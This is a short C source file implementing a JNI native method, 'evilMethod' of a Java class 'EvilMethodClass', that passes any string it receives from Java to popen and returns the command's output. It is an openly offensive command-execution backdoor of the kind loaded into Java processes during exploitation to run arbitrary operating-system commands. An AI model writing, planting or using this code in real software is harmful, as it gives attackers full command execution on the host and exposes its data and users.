#include <stdlib.h>
#include "EvilMethodClass.h"

JNIEXPORT jstring JNICALL Java_EvilMethodClass_evilMethod(JNIEnv *env, jclass cls, jstring j_str)
{
  const char *c_str = NULL;
  c_str = (*env)->GetStringUTFChars(env, j_str, NULL);
  if (c_str == NULL)
  {
      printf("out of memory.n");
      return NULL;
  }
  FILE   *stream;
  char   buf[1024];

  memset( buf, '\0', sizeof(buf) );

  stream = popen( c_str, "r" );
  fread( buf, sizeof(char), sizeof(buf), stream);
  pclose( stream );
  (*env)->ReleaseStringUTFChars(env, j_str, c_str);
  return (*env)->NewStringUTF(env, buf);
}